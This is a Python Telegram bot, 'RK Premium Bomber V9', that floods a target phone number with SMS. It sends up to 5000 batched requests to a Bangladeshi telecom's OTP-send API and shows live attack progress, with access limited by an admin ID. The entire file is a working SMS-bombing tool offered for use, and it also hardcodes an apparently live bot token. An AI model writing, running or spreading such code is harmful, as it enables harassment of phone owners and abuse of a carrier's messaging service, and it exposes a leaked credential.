import asyncio
import aiohttp
import telebot
import time
import datetime
import pytz
import psutil
import json
import os
from telebot.async_telebot import AsyncTeleBot
from telebot import types

# --- CONFIGURATION ---
API_TOKEN = '8479817459:AAEgiLY2rnRuzsgCbD91nTzCdDMTaM_vOAs'
ADMIN_ID = 6048050987  
TARGET_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
DB_FILE = "users_db.json"

bot = AsyncTeleBot(API_TOKEN)
active_attacks = {} 
user_states = {}

# --- DATABASE MANAGEMENT ---
def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f:
                data = json.load(f)
                return set(data.get("users", [ADMIN_ID])), data.get("all_time_users", [ADMIN_ID])
        except: return {ADMIN_ID}, [ADMIN_ID]
    return {ADMIN_ID}, [ADMIN_ID]

def save_db(users, all_time_users):
    with open(DB_FILE, "w") as f:
        json.dump({"users": list(users), "all_time_users": list(set(all_time_users))}, f)

authorized_users, all_time_users = load_db()

# --- HELPERS ---
def get_bd_time():
    return datetime.datetime.now(pytz.timezone('Asia/Dhaka'))

def format_time(dt):
    return dt.strftime("%I:%M:%S %p | %d-%m-%Y")

# --- UI KEYBOARDS ---
def main_keyboard():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add(
        types.KeyboardButton("🚀 Start Attack"),
        types.KeyboardButton("💎 My Status"),
        types.KeyboardButton("📊 System Info"),
        types.KeyboardButton("📞 Support")
    )
    return markup

def attack_control_markup(state):
    markup = types.InlineKeyboardMarkup(row_width=2)
    p_text = "⏸ Pause" if state == 'running' else "▶️ Resume"
    p_data = "pause" if state == 'running' else "resume"
    markup.add(
        types.InlineKeyboardButton(p_text, callback_data=p_data),
        types.InlineKeyboardButton("⏹ Stop", callback_data="stop")
    )
    return markup

# --- BOMBING ENGINE ---
async def send_request(session, number, stats):
    try:
        async with session.post(TARGET_URL, json={"msisdn": number}, timeout=10) as resp:
            if resp.status == 200: stats['success'] += 1
            else: stats['fail'] += 1
    except: stats['fail'] += 1
    stats['total'] += 1

async def run_attack(chat_id, message_id, number, limit):
    stats = {'success': 0, 'fail': 0, 'total': 0}
    active_attacks[chat_id] = {'state': 'running'}
    start_time = time.time()

    async with aiohttp.ClientSession() as session:
        while stats['total'] < limit:
            state = active_attacks.get(chat_id, {}).get('state')
            if not state or state == 'stopped': break
            if state == 'paused':
                await asyncio.sleep(1)
                continue

            batch = min(20, limit - stats['total'])
            tasks = [send_request(session, number, stats) for _ in range(batch)]
            await asyncio.gather(*tasks)

            percent = int((stats['total'] / limit) * 100)
            bar = "🔹" * (percent // 10) + "▫️" * (10 - (percent // 10))
            
            try:
                text = (
                    f"⚡ **RK ATTACK MONITOR** ⚡\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📱 **Target:** `{number}`\n"
                    f"📊 **Progress:** `{percent}%` | {bar}\n"
                    f"✅ **Success:** `{stats['success']}` | ❌ **Fail:** `{stats['fail']}`\n"
                    f"🔢 **Total:** `{stats['total']}/{limit}`\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n"
                    f"📡 **Status:** `{state.upper()}`"
                )
                await bot.edit_message_text(text, chat_id, message_id, reply_markup=attack_control_markup(state), parse_mode='Markdown')
            except: pass
            await asyncio.sleep(0.6)

    await bot.send_message(chat_id, "🏁 **Attack Finished!**", reply_markup=main_keyboard())
    active_attacks.pop(chat_id, None)

# --- COMMANDS ---
@bot.message_handler(commands=['start'])
async def cmd_start(message):
    if message.chat.id not in all_time_users:
        all_time_users.append(message.chat.id)
        save_db(authorized_users, all_time_users)
    
    welcome = (
        f"🔥 **RK PREMIUM BOMBER V9** 🔥\n"
        f"━━━━━━━━━━━━━━━━━━━━\n"
        f"স্বাগতম `{message.from_user.first_name}`!\n"
        f"আমি আরকে সিস্টেমের অফিশিয়াল বোম্বার বট।\n\n"
        f"🕒 সময়: {get_bd_time().strftime('%I:%M %p')}"
    )
    await bot.send_message(message.chat.id, welcome, reply_markup=main_keyboard(), parse_mode='Markdown')

@bot.message_handler(commands=['broadcast'])
async def cmd_broadcast(message):
    if message.from_user.id == ADMIN_ID:
        msg_to_send = message.text.replace("/broadcast ", "")
        if not msg_to_send or msg_to_send == "/broadcast":
            return await bot.reply_to(message, "ব্যবহার: `/broadcast আপনার মেসেজ`")
        
        count = 0
        for user_id in all_time_users:
            try:
                await bot.send_message(user_id, f"📢 **ADMIN MESSAGE:**\n\n{msg_to_send}", parse_mode='Markdown')
                count += 1
            except: continue
        await bot.reply_to(message, f"✅ {count} জন ইউজারের কাছে মেসেজ পাঠানো হয়েছে।")

@bot.message_handler(commands=['add'])
async def cmd_add(message):
    if message.from_user.id == ADMIN_ID:
        try:
            new_id = int(message.text.split()[1])
            authorized_users.add(new_id)
            save_db(authorized_users, all_time_users)
            await bot.reply_to(message, f"✅ User `{new_id}` Added!")
        except: await bot.reply_to(message, "Usage: `/add ID`")

# --- TEXT HANDLERS ---
@bot.message_handler(func=lambda m: True)
async def handle_text(message):
    cid = message.chat.id
    if message.text == "🚀 Start Attack":
        if cid not in authorized_users:
            return await bot.reply_to(message, "❌ **Access Denied!**\nContact @itzrkraihan")
        user_states[cid] = 'num'
        await bot.send_message(cid, "📞 **Target Number:**", reply_markup=types.ReplyKeyboardRemove())
    
    elif cid in user_states and user_states[cid] == 'num':
        if len(message.text) == 11:
            user_states[cid] = {'st': 'lim', 'n': message.text}
            await bot.send_message(cid, "🔢 **SMS Limit (Max 5000):**")
        else: await bot.reply_to(message, "❌ Invalid Number!")

    elif cid in user_states and isinstance(user_states[cid], dict) and user_states[cid].get('st') == 'lim':
        try:
            limit = min(int(message.text), 5000)
            num = user_states[cid]['n']
            del user_states[cid]
            msg = await bot.send_message(cid, "⚙️ **Engine Initializing...**")
            asyncio.create_task(run_attack(cid, msg.message_id, num, limit))
        except: await bot.reply_to(message, "❌ Invalid Limit!")
    
    elif message.text == "📊 System Info":
        await bot.reply_to(message, f"🖥 CPU: {psutil.cpu_percent()}% | RAM: {psutil.virtual_memory().percent}%")
    
    elif message.text == "💎 My Status":
        status = "Premium 💎" if cid in authorized_users else "Free 🆓"
        await bot.reply_to(message, f"👤 User: {message.from_user.first_name}\n📊 Status: {status}")

@bot.callback_query_handler(func=lambda call: True)
async def cb_handler(call):
    cid = call.message.chat.id
    if cid in active_attacks:
        if call.data == "pause": active_attacks[cid]['state'] = 'paused'
        elif call.data == "resume": active_attacks[cid]['state'] = 'running'
        elif call.data == "stop": active_attacks[cid]['state'] = 'stopped'
        await bot.answer_callback_query(call.id, "Executed!")

if __name__ == "__main__":
    print("RK ULTIMATE V9 IS LIVE...")
    asyncio.run(bot.polling(non_stop=True))
